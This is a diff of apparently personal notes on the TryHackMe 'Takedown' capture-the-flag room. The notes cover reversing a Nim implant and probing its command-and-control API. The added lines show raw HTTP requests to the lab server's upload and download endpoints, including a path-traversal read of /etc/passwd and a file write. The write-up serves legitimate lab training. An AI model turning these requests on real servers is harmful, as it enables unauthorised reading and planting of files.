@@ -4,7 +4,7 @@ https://tryhackme.com/room/takedown
 
 Rated "INSANE"
 
-- the server exposes port 80 (TODO CHECK)
+- the server exposes port 22 and 80
 - on the site, the favicon.ico is a windows binary. Additionally, under /images is shuttlebug.jpg.bak (an IoC according to the rooms intro) which is also a binary. These are the same program, for windows and linux.
 
 Which binary you reverse doesn't matter so much, as much as what it does. Opening them with Ghidra shows they are nim binaries, which is a bit tricky to reverse but still possible.
@@ -54,7 +54,7 @@ Which binary you reverse doesn't matter so much, as much as what it does. Openin
   - `hostname`
   - `pwd`
 
-- when it receives a command, this is passed to `command_handler__main`, which splits the command on spaces. there are only a fixed number of commands, of which the most interesting are `exec`, `upload` and `download`. the command is run and then the result returned to main
+- when it receives a command, this is passed to `command_handler__main`, which splits the command on spaces. there are only a fixed number of commands, of which the most interesting are `upload` and `download`. the command is run and then the result returned to main
 - once run, the results are sent back to the command api handler as a post request, with the value in a results parameter:
 
   ```
@@ -69,3 +69,39 @@ Which binary you reverse doesn't matter so much, as much as what it does. Openin
   ```
 
   comes back with `OK`
+  
+- the upload command appears to mean upload a file from the server to the host:
+
+  ```
+  POST /api/agents/fakeuid/upload HTTP/1.1
+  Host: takedown.thm.local
+  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5
+  Connection: close
+  Content-Type: application/json
+  Content-Length: 22
+
+  {"file":"bar.txt"}
+
+
+  ```
+  
+  this responds with this file from the server. the path is straight interpreted: /etc/passwd works to grab that file
+  
+- download copies to the server, passing a payload like `{"file":"","data":""}`:
+
+  ```
+  POST /api/agents/fakeuid/download HTTP/1.1
+  Host: takedown.thm.local
+  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5
+  Connection: close
+  Content-Type: application/json
+  Content-Length: 45
+
+  {"file":"test.txt",
+  "data":"dGVzdA=="
+  }
+
+
+  ```
+  
+  its unclear where this data lands
